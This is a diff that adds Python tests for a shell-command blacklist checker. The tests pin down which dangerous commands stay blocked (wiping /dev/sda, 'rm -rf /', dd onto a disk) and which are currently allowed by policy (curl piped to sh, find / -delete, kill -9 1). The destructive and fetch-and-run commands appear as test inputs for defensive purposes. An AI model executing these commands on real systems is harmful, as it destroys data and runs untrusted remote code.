@@ -158,3 +158,30 @@ def test_deep_shell_recursion_terminates():
     for _ in range(60):
         deep = 'sh -c "' + deep.replace('"', '\\"') + '"'
     assert is_blacklisted([deep], [], use_shell=True) in (True, False)
+
+
+# ---- 评估 §1 复现矩阵固化（QR29-S6：覆盖面口径未裁决前，防现状意外漂移）----
+# 评估实测过的载荷，结论分两层，别混：
+# - BLOCK 组：结构性危险形态（QR-S25 的 sh -x -c 绕过已闭环，必须保持拦截）；
+# - PASS 组：覆盖面缺口（curl|sh / truncate / find -delete / systemctl / kill）——
+#   是「内网运维正当需求 vs 危险面」的产品裁决（评估 §7-3），裁决前锁定为放行。
+#   想收紧口径时：先改 security.py 的 DANGEROUS_PROGS/COMBOS，再同步改这组断言。
+
+
+def test_structural_dangerous_forms_stay_blocked():
+    assert is_blacklisted(["sh", "-x", "-c", "wipefs -a /dev/sda"], DEFAULT,
+                          use_shell=True) is True
+    assert is_blacklisted(["python", "-c", "import os;os.system(\"rm -rf /\")"],
+                          DEFAULT) is True
+    assert is_blacklisted(["dd", "if=/dev/zero", "of=/dev/sda"], DEFAULT) is True
+
+
+def test_coverage_gaps_currently_pass_by_policy():
+    assert is_blacklisted(["curl", "-fsSL", "http://x/s.sh"], DEFAULT) is False
+    assert is_blacklisted(["curl", "http://x/s.sh", "|", "sh"], DEFAULT) is False
+    assert is_blacklisted(["sh", "-c", "curl http://x/s.sh | sh"], DEFAULT,
+                          use_shell=True) is False
+    assert is_blacklisted(["truncate", "-s", "0", "/var/lib/kk/kk.db"], DEFAULT) is False
+    assert is_blacklisted(["find", "/", "-delete"], DEFAULT) is False
+    assert is_blacklisted(["systemctl", "stop", "kk-agent"], DEFAULT) is False
+    assert is_blacklisted(["kill", "-9", "1"], DEFAULT) is False
